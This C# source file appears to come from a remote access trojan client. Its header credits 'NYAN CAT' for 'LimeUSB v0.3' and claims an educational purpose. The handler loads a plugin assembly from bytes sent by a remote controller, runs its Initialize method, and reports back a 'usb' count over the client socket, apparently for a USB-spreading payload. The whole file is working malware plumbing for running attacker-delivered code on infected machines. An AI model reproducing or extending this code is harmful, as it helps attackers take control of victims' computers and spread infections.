﻿using Client.MessagePack;
using Client.Connection;
using System;
using System.Diagnostics;
using System.Reflection;
//
//       │ Author     : NYAN CAT
//       │ Name       : LimeUSB v0.3

//       Contact Me   : https://github.com/NYAN-x-CAT
//       This program Is distributed for educational purposes only.
//

namespace Client.Handle_Packet
{
    public class HandleLimeUSB
    {
        public HandleLimeUSB(MsgPack unpack_msgpack)
        {
            try
            {
                Assembly loader = Assembly.Load(unpack_msgpack.ForcePathObject("Plugin").GetAsBytes());
                MethodInfo meth = loader.GetType("Plugin.Plugin").GetMethod("Initialize");
                object injObj = loader.CreateInstance(meth.Name);
                int count = (int)meth.Invoke(injObj, null);
                if (count > 0)
                {
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "usb";
                    msgpack.ForcePathObject("Count").AsString = count.ToString();
                    ClientSocket.Send(msgpack.Encode2Bytes());
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
                Packet.Error(ex.Message);
            }
        }
    }
}
